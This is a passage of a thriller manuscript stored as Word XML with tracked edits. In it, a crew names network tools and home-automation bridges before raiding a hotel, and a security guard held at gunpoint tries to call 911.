        <w:t>. “Uncle, that thing is useless! You wear that, you have no idea what’s happening around you. Look…!” He reached his hands out on either side of Sergey’s fully encased head, and began snapping his fingers on alternate sides. “Over here! No, over here! Over here! …See? Nothing.”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mumbled, “Over here, smartass,” and swung his MAC-10 out at Eugene’s unprotected cheekbone, quick enough to startle him but softly enough to do no harm. Eugene ducked to avoid the pistol-whipping, and reached up to seize Sergey’s elbow and wrist. Sergey found his arm trapped in a limb-lock that would’ve sent the gun clattering to the floor if Eugene applied any more force. Sergey responded with a shield-bash, smacking the black polymer bubble against Eugene’s body</w:t>
      </w:r>
      <w:ins w:id="2742" w:author="TextVet" w:date="2016-03-28T10:32:00Z">
        <w:r w:rsidR="00A00845">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2743" w:author="TextVet" w:date="2016-03-28T10:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A00845">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> and making him</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2744" w:author="TextVet" w:date="2016-03-28T10:32:00Z">
        <w:r w:rsidR="00A00845">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> Eugene</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> stumble</w:t>
      </w:r>
      <w:ins w:id="2745" w:author="TextVet" w:date="2016-03-28T10:32:00Z">
        <w:r w:rsidR="00C344F6">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several feet backwards.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two men laughed, and spoke in Russian with warm, familial tones.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attention was pulled away by the sound of Mike’s voice in his earpiece. “Danny, are you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turned away, his face hard with concentration. “What’s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have good news and bad news. I found several X10/IP bridges.”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w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>spectacular</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,” said Danny. “What’s the bad news?”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“There’s a huge number of X10 controllers in the building,” said Mike. “I can’t tell which ones correspond to the penthouse. We need to go through them one by one to figure it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“I’ll get you additional manpower,” said Danny. “Moshen! This X10 issue. Can you help?”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Moshen hesitated. “Uh… What’s an X10?”</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“Home automation,” Danny explained. “It’s a language spoken by electrical appliances. Lights, heating, air conditioning, entertainment systems, that kind of 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recoiled. “I just build websites,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went to the back of the van to dig out a boxy old laptop. “Wireshark,” Danny said briskly as he dusted off the computer. “</w:t>
      </w:r>
      <w:commentRangeStart w:id="2746"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:commentRangeEnd w:id="2746"/>
      <w:r w:rsidR="00421D94">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="2746"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>cpdump. nmap. netcat. dd.”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“Those are network probing tools, right?” asked Moshen.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you use them?” he asked, booting up the laptop.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“Um…” said Moshen.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shoved the laptop into his hands. “Learn. Fast.”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From around the other side of the van, </w:t>
      </w:r>
      <w:del w:id="2747" w:author="TextVet" w:date="2016-03-28T10:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D363B1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">the deep voice of </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Sergey</w:t>
      </w:r>
      <w:ins w:id="2748" w:author="TextVet" w:date="2016-03-28T10:36:00Z">
        <w:r w:rsidR="00D363B1">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 xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="2749" w:author="TextVet" w:date="2016-03-28T10:36:00Z">
        <w:r w:rsidR="00D363B1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">voice </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>rumbled. “Can we get moving yet? It is getting hot in this suit.”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“Let me check,” Danny replied. “Mike and Natalie! Have you found a path these guys can take through the building without being seen?”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Mike’s voice buzzed in the earpiece. “Yes. Up the back stairs — it connects to the hotel’s rear maintenance corridor.”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grabbed his HERF gun and </w:t>
      </w:r>
      <w:del w:id="2750" w:author="TextVet" w:date="2016-03-28T10:37:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004B6151">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">his </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>toolbox, and began walking toward the garage’s rear stairwell. “Guys</w:t>
      </w:r>
      <w:ins w:id="2751" w:author="TextVet" w:date="2016-03-28T10:37:00Z">
        <w:r w:rsidR="004B6151">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2752" w:author="TextVet" w:date="2016-03-28T10:37:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004B6151">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753" w:author="TextVet" w:date="2016-03-28T10:37:00Z">
        <w:r w:rsidR="004B6151">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2754" w:author="TextVet" w:date="2016-03-28T10:37:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004B6151">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>L</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>et’s get moving.”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called out, “Hey, hold on! Almost done here…” He knelt over a large spool of black nylon rope. He was in the process of cutting two- and three-foot lengths with a serrated blade.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muttered, “Do I even want to know what that’s for?”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="2755" w:author="TextVet" w:date="2016-03-28T10:38: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“Rope is for many things.” He finished the last of the cuts, then hurriedly stuffed the spool into a backpack. “But first,” he added, “it’s for making a few inconvenient people go away.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008B28CA" w:rsidRPr="000D3488" w:rsidRDefault="008B28CA" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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Dominga Torres was a stout, brawny woman.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> Under her uniform, her abdomen still bore a calligraphic “Chola 4 Life” tattoo, an embarrassing reminder of her teen years in East L.A.</w:t>
      </w:r>
      <w:del w:id="2756" w:author="TextVet" w:date="2016-03-28T10:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003D5BB3">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Much of her early life was spent in and out of juvenile detention centers, cursing authority figures with vows of vengeance. But</w:t>
      </w:r>
      <w:ins w:id="2757" w:author="TextVet" w:date="2016-03-28T10:39:00Z">
        <w:r w:rsidR="00445B6D">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ins w:id="2758" w:author="TextVet" w:date="2016-03-28T10:38:00Z">
        <w:r w:rsidR="00445B6D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>on</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2759" w:author="TextVet" w:date="2016-03-28T10:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00445B6D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>when she</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> bec</w:t>
      </w:r>
      <w:ins w:id="2760" w:author="TextVet" w:date="2016-03-28T10:39:00Z">
        <w:r w:rsidR="00445B6D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>o</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2761" w:author="TextVet" w:date="2016-03-28T10:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00445B6D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>a</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:ins w:id="2762" w:author="TextVet" w:date="2016-03-28T10:39:00Z">
        <w:r w:rsidR="00445B6D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2763" w:author="TextVet" w:date="2016-03-28T10:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00445B6D">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xml:space="preserve"> a </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>mother, she</w:t>
      </w:r>
      <w:ins w:id="2764" w:author="TextVet" w:date="2016-03-28T10:39:00Z">
        <w:r w:rsidR="00445B6D">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t</w:t>
      </w:r>
      <w:ins w:id="2765" w:author="TextVet" w:date="2016-03-28T10:39:00Z">
        <w:r w:rsidR="00445B6D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>a</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2766" w:author="TextVet" w:date="2016-03-28T10:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00445B6D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>oo</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:ins w:id="2767" w:author="TextVet" w:date="2016-03-28T10:39:00Z">
        <w:r w:rsidR="00445B6D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>en</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> stock of herself and the kind of world she wanted </w:t>
      </w:r>
      <w:ins w:id="2768" w:author="TextVet" w:date="2016-03-28T10:40:00Z">
        <w:r w:rsidR="00445B6D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">for </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>her babies</w:t>
      </w:r>
      <w:del w:id="2769" w:author="TextVet" w:date="2016-03-28T10:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00445B6D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> to live in</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. Her dream now was to land a position with the LAPD, and then see the expressions on her old friends’ faces when she’d come back into her old hood on the other side of the thin blue line. </w:t>
      </w:r>
      <w:del w:id="2770" w:author="TextVet" w:date="2016-03-28T10:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D21B76">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>But f</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2771" w:author="TextVet" w:date="2016-03-28T10:41:00Z">
        <w:r w:rsidR="00D21B76">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>F</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">or now, </w:t>
      </w:r>
      <w:ins w:id="2772" w:author="TextVet" w:date="2016-03-28T10:41:00Z">
        <w:r w:rsidR="00D21B76">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">though, </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>she carried no gun, and her badge was simply a token brass shield printed with the words “Security Guard”, provided</w:t>
      </w:r>
      <w:del w:id="2773" w:author="TextVet" w:date="2016-03-28T10:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D21B76">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> to her</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> by the Medina Gallante.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female voice squawked from the walkie-talkie. “Attention all Gallante security staff. If any remaining personnel have not yet received their individual briefing on tonight’s training exercises, please respond.”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voice had been buzzing from the radio for the last half hour. The unfamiliar woman identified herself as a dispatcher from RockBox Digital Security, the company that had built the Gallante’s camera and radio systems. Torres had listened to the chatter as her fellow guards had been called up, one by one, to discuss some new procedure that RockBox wanted them to follow.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Torres took one last long drag from her cigarette before extinguishing it in the patio ashtray. “Torres to Dispatch. Just finishing a smoke break. What do you need? Over.”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“Please report to the security office,” the voice said. “Our field agent will give you an in-person outline of your role in tonight’s activities.”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my way,” said Torres. “Over and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reentered the building from the smoking balcony and marched through the wide posh passages of the Gallante, feeling comfortably dominant in the maze of halls and stairways that she spent every day protecting. A trip down an elevator and through a side door marked “HOTEL STAFF ONLY” placed her in a drab white corridor lit by faintly humming fluorescent bulbs.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Torres strode up to an unremarkable gray door with a black placard printed with “SECURITY” — her base of operations. She rapped her knuckles against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door opened inward, apparently under its own power. Whoever </w:t>
      </w:r>
      <w:ins w:id="2774" w:author="TextVet" w:date="2016-03-28T10:43:00Z">
        <w:r w:rsidR="00483139">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">had </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">opened the door stood behind it rather than </w:t>
      </w:r>
      <w:ins w:id="2775" w:author="TextVet" w:date="2016-03-28T10:44:00Z">
        <w:r w:rsidR="00483139">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>emerging</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2776" w:author="TextVet" w:date="2016-03-28T10:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00483139">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>coming out</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to greet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Through the doorway, she could see the main security console. It consisted of a large desk rigged with a radio dispatch board, a computer station, a 9-1-1 hotline, and a dozen display screens showing feeds from the hotel’s security cameras. It was normally occupied by Karl or Arnie, who would’ve been sitting in the swivel chair. But the chair was empty; the security console, against protocol, was unmanned.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If there was one thing she</w:t>
      </w:r>
      <w:ins w:id="2777" w:author="TextVet" w:date="2016-03-28T10:44:00Z">
        <w:r w:rsidR="007304D5">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learned in East L.A., it was how to spot a set-up.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backed away and reached down to grab her radio. Goosebumps on her arms brushed electrically against the inside of her uniform.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back pressed against something pointed and solid. She heard a click behind her. It was a very distinctive sound: a revolver’s hammer being cocked.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“Don’t turn around,” a voice said. It had an accent. European of some kind. “And don’t scream.”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breathing quickened. Moving slowly, Torres spread her arms out and lifted them above her head. “What do you want?” she said quietly.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“Please step through the doorway,” said the voice.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spirit bucked in defiance. She suppressed her instincts and forced herself to comply.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When she was finally inside the office, she saw Karl and Arnie and the rest of the security staff. They were all gagged and bound with cords of nylon rope, tied to a water pipe that ran through the office.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standing several feet from them, ensuring their silence, was a man with IOTV body armor, a full-faced helmet, and a highly accessorized M4 rifle.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intruder who</w:t>
      </w:r>
      <w:ins w:id="2778" w:author="TextVet" w:date="2016-03-28T10:46:00Z">
        <w:r w:rsidR="001069E0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2779" w:author="TextVet" w:date="2016-03-28T10:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001069E0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> ha</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d opened the door closed it behind her. He stepped into her view, and pointed a MAC-10 at her torso. He was a behemoth of a man. A black riot shield was strapped to his left arm. Through the visor of his helmet, she saw that his eyes were determined and professional.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was not a mere robbery. This was some kind of full-scale military operation.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Medina Gallante was frequently visited by foreign dignitaries. She had always entertained the notion that, at some point, some high-value political target would appear on its guest roster. That day must have finally come.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voice behind her spoke. “Slowly lower your hands and put your wrists together behind your back.”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voice’s accent clinched the conclusion in her mind. This was a Special Ops attack by a foreign power. Every man, woman, and child in the Gallante was in danger.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fellow guards had all been rendered helpless. Torres was the last one left.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took a deep breath. She began to lower her arms. But as she brought them down, she simultaneously began bending her knees into a crouch.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babies would always know that their mommy died fighting for what’s right. For their entire lives, that knowledge would give them strength and guidance. For a gift like that to give to her children, she was willing to pay the cost.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lunged for the security console.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desk was a 9-1-1 hotline — a bright yellow telephone that connected directly to the Bellevue PD automatically just by being picked up. The police department’s phone system would begin recording the call immediately, ensuring that somebody would hear her last words. She grabbed the corded handset and dove beneath the desk.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00566952" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2780" w:author="TextVet" w:date="2016-03-28T10:49:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>“Medina Gallante hotel under foreign military attack!”</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
